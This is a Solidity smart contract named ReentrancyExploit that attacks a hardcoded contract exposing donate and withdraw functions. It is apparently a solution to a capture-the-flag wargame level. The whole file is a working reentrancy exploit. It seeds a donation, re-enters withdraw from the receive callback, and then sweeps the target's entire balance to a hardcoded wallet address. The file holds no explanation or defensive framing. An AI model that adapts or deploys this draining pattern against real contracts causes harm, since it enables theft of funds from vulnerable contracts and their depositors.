// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyExploit {
    bool public returned = false;
    IReentrance constant public reentrance = IReentrance(0x38a0d8D180D950FD0342a61057f298Ba660C5fAc);

    function sweep() external {
        reentrance.withdraw(address(reentrance).balance);
        (bool success,) = payable(0x1eBF14FD23d0D530a7eB2605145C1b0931837E49).call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        if (msg.sender == 0x1eBF14FD23d0D530a7eB2605145C1b0931837E49) {
            reentrance.donate{value: msg.value}(address(this));
            reentrance.withdraw(msg.value);
        }
        else {
            if (!returned) {
                returned = true;
                reentrance.withdraw(1);
            }
        }
    }
}
